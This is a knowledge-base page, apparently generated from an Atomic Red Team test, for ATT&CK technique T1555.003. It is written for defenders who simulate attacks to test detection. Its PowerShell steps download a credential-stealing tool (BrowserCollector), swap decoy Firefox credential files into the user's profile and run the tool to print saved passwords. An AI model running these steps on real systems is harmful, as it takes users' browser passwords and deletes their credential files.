---
atomic_guid: "6f2c5c87-a4d5-4898-9bd1-47a55ecaf1dd"
title: "BrowserStealer (Chrome / Firefox / Microsoft Edge)"
framework: "atomic"
generated: "true"
attack_technique_id: "T1555.003"
attack_technique_name: "Credentials from Password Stores: Credentials from Web Browsers"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1555.003/T1555.003.yaml"
build_date: "2026-04-27 19:12:28"
executor: "powershell"
aliases:
  - "6f2c5c87-a4d5-4898-9bd1-47a55ecaf1dd"
  - "BrowserStealer (Chrome / Firefox / Microsoft Edge)"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

[Github Repo](https://github.com/SaulBerrenson/BrowserStealer) Simple password/cookies stealer for chrome, edge, and gecko based browsers (30 listed working). This attack simulates stealing the data from the browser files and printing them to the command line.
If using to test with Firefox, if the browser is x64 you need to use the x64 build

## ATT&CK Mapping

- [[kb/attack/techniques/T1555-credentials_from_password_stores#^t1555003-credentials-from-web-browsers|T1555.003: Credentials from Web Browsers]]

## Dependencies

Firefox must be on the device.

### Prerequisite Check

```powershell
if ((Test-Path "C:\Program Files\Mozilla Firefox\firefox.exe") -Or (Test-Path "C:\Program Files (x86)\Mozilla Firefox\firefox.exe")) {exit 0} else {exit 1}
```

### Get Prerequisite

```powershell
New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
$installer = "PathToAtomicsFolder\..\ExternalPayloads\FirefoxStubInstaller.exe"
Invoke-WebRequest -OutFile $installer "https://download.mozilla.org/?product=firefox-stub&os=win&lang=en-US"
Start-Process -FilePath $installer -Wait
Stop-Process -Name "firefox"
```

BrowserCollector must exist in the bin directory

### Prerequisite Check

```powershell
if (Test-Path "PathToAtomicsFolder\T1555.003\bin\BrowserCollector.exe") {exit 0} else {exit 1}
```

### Get Prerequisite

```powershell
New-Item -Type Directory "PathToAtomicsFolder\T1555.003\bin\" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest "https://github.com/SaulBerrenson/BrowserStealer/releases/download/1.0.0.4/BrowserCollector_x64.exe" -Outfile: "PathToAtomicsFolder\T1555.003\bin\BrowserCollector.exe"
```

Login Data file that is a copy of a Firefox Login Data that contains credentials for the tool to "steal." Must exist at the specified path.

### Prerequisite Check

```powershell
if (Test-Path "PathToAtomicsFolder\T1555.003\src\key4.db") {exit 0} else {exit 1}
```

### Get Prerequisite

```powershell
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1555.003/src/key4.db?raw=true" -Outfile: "PathToAtomicsFolder\T1555.003\src\key4.db"
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1555.003/src/logins.json?raw=true" -Outfile: "PathToAtomicsFolder\T1555.003\src\logins.json"
```

## Executor

- name: powershell

### Command

```powershell
$profile = (Gci -filter "*default-release*" -path $env:Appdata\Mozilla\Firefox\Profiles\).FullName
Copy-Item $profile\key4.db -Destination "PathToAtomicsFolder\..\ExternalPayloads" > $null
Copy-Item $profile\logins.json -Destination "PathToAtomicsFolder\..\ExternalPayloads" > $null
Remove-Item $profile\key4.db > $null
Remove-Item $profile\logins.json > $null
Copy-Item "$env:PathToAtomicsFolder\T1555.003\src\key4.db" -Destination $profile\ > $null
Copy-Item "$env:PathToAtomicsFolder\T1555.003\src\logins.json" -Destination $profile\ > $null
cd "$env:PathToAtomicsFolder\T1555.003\bin"
""|.\BrowserCollector.exe
```

### Cleanup

```powershell
$profile = (Gci -filter "*default-release*" -path $env:Appdata\Mozilla\Firefox\Profiles\).FullName
Remove-Item $profile\key4.db > $null
Remove-Item $profile\logins.json > $null
Copy-Item "PathToAtomicsFolder\..\ExternalPayloads" -Destination $profile\ > $null
Remove-Item "PathToAtomicsFolder\..\ExternalPayloads\key4.db" > $null
Remove-Item "PathToAtomicsFolder\..\ExternalPayloads\logins.json" > $null
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1555.003/T1555.003.yaml)
